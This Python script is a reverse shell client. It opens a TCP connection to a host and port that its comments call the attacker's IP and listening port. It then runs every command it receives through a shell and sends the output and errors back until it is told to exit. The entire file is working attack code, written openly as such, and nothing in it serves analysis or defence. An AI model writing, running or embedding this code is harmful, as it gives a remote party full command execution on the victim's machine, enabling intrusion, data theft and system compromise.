import socket
import subprocess

from socket_client_server import HOST, PORT


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # start a socket object 's'
    s.connect((HOST, PORT))  # Here we define the Attacker IP and the listening port

    while True:
        command = s.recv(1024)  # read the first KB of the tcp socket
        if 'exit' in command.decode():  # if we got terminate order from the attacker, close the socket
            s.close()
            break
        else:  # otherwise, we pass the received command to a shell process
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            # Send the output and error back to the client
            s.sendall(stdout)
            s.sendall(stderr)


if __name__ == "__main__":
    connect()
